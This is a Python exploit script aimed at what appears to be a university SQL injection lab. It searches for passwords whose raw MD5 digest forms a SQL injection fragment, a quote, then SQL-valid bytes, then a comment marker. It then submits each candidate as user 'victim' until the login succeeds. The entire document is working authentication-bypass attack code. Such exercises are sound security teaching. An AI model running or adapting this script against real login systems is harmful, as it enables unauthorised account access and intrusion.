import hashlib
import random
import string
import requests

TARGET_URL = "https://webproject.gtinfosec.org/sqlinject/2"
CHARS = string.ascii_letters + string.digits
VALID_SQL_CHARS = set("0123456789 \t\r\n()=!<>|&+-/*")

def hash_contains_injection(digest: bytes) -> bool:
    decoded = digest.decode("latin-1")
    for i, ch in enumerate(decoded):
        if ch != "'":
            continue
        for j in range(i + 1, len(decoded)):
            between = decoded[i + 1:j]
            if decoded[j] == "#" and between and all(c in VALID_SQL_CHARS for c in between):
                return True
            if decoded[j:j+3] == "-- " and between and all(c in VALID_SQL_CHARS for c in between):
                return True
    return False

def generate_password(length=8):
    return "".join(random.choice(CHARS) for _ in range(length))

def main():
    attempts = 0
    print("Searching for injectable password hash...")
    while True:
        password = generate_password()
        digest = hashlib.md5(password.encode("latin-1")).digest()
        attempts += 1
        if attempts % 5000 == 0:
            print(f"Attempts so far: {attempts}")
        if not hash_contains_injection(digest):
            continue
        print(f"Potential injection found with password: {password}")
        response = requests.post(
            TARGET_URL,
            data={"username": "victim", "password": password},
            timeout=10,
        )
        if "Login successful!" in response.text and "victim" in response.text:
            print(f"\nSuccess! Password: {password}")
            print(f"Total attempts: {attempts}")
            break
        else:
            print("Hash had injection pattern but login failed, continuing...")

if __name__ == "__main__":
    main()